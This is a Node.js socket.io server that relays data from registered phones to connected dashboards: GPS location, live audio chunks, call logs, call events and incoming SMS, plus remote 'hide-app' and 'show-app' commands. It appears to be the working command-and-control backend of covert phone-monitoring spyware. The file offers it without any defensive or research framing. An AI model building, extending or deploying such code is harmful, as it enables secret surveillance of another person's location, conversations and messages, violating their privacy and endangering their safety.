const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Serve dashboard
app.use(express.static(path.join(__dirname, "public"))); // keep your index.html inside /public

// Track devices and listeners
const devices = {};   // { deviceId: socketId }
const listeners = []; // all dashboards

io.on("connection", (socket) => {
  console.log("New client connected:", socket.id);

  // Device registers itself
  socket.on("device-register", (deviceId) => {
    devices[deviceId] = socket.id;
    console.log(`📱 Device registered: ${deviceId}`);
    // Notify dashboards
    listeners.forEach((listener) => {
      listener.emit("device-registered", deviceId);
    });
  });

  // Dashboard registers itself
  socket.on("listener-register", () => {
    console.log("🖥️ Dashboard connected:", socket.id);
    listeners.push(socket);

    // Send already registered devices
    Object.keys(devices).forEach((deviceId) => {
      socket.emit("device-registered", deviceId);
    });
  });

  // Location updates
  socket.on("location-update", (data) => {
    const { deviceId, lat, lng } = data;
    console.log(`📍 Location from ${deviceId}: ${lat}, ${lng}`);
    listeners.forEach((listener) => {
      listener.emit("location-update", { deviceId, lat, lng });
    });
  });

  // Audio stream
  socket.on("audio-chunk", (data) => {
    const { deviceId, base64Chunk } = data;
    listeners.forEach((listener) => {
      listener.emit("audio-chunk", { deviceId, base64Chunk });
    });
  });

  // Call logs
  socket.on("call-logs", (data) => {
    const { deviceId, logs } = data;
    listeners.forEach((listener) => {
      listener.emit("call-logs", { deviceId, logs });
    });
  });

  // Call events
  socket.on("call-event", (data) => {
    const { deviceId, event } = data;
    listeners.forEach((listener) => {
      listener.emit("call-event", { deviceId, event });
    });
  });

  // SMS
  socket.on("sms-received", (data) => {
    const { deviceId, sms } = data;
    listeners.forEach((listener) => {
      listener.emit("sms-received", { deviceId, sms });
    });
  });

  // Remote control (from dashboard → device)
  socket.on("hide-app-server", ({ deviceId }) => {
    const devSocketId = devices[deviceId];
    if (devSocketId) io.to(devSocketId).emit("hide-app");
  });

  socket.on("show-app-server", ({ deviceId }) => {
    const devSocketId = devices[deviceId];
    if (devSocketId) io.to(devSocketId).emit("show-app");
  });

  // Handle disconnect
  socket.on("disconnect", () => {
    console.log("Client disconnected:", socket.id);

    // If it was a device, remove from list
    const deviceId = Object.keys(devices).find((id) => devices[id] === socket.id);
    if (deviceId) {
      delete devices[deviceId];
      console.log(`❌ Device disconnected: ${deviceId}`);
    }

    // If it was a dashboard, remove from listeners
    const idx = listeners.indexOf(socket);
    if (idx !== -1) listeners.splice(idx, 1);
  });
});

// Start server
const PORT = 3001;
server.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
